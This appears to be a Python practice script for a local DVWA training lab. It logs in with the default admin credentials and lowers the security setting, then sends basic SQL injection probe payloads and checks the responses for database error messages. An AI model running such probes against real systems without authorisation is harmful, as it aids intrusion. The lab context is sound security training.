import requests
from bs4 import BeautifulSoup

s = requests.Session()

login_url = "http://localhost/DVWA/login.php"

r = s.get(login_url)

soup = BeautifulSoup(r.text, "html.parser")
token = soup.find("input", {"name": "user_token"})["value"]

print("[+] Token:", token)

login_data = {
    "username": "admin",
    "password": "password",
    "Login": "Login",
    "user_token": token
}

r2 = s.post(login_url, data=login_data)

print("[+] Login status:", r2.status_code)

s.get("http://localhost/DVWA/security.php?security=low&seclev_submit=Submit")

url = "http://localhost/DVWA/vulnerabilities/sqli/"

payloads = ["1", "'", '"', "--", "'("]

for payload in payloads:
    r = s.get(url, params={"id": payload})

    print("\nPayload:", payload)
    print("Status:", r.status_code)

    if "sql" in r.text.lower() or "mysql" in r.text.lower():
        print("[!] możliwy SQL error")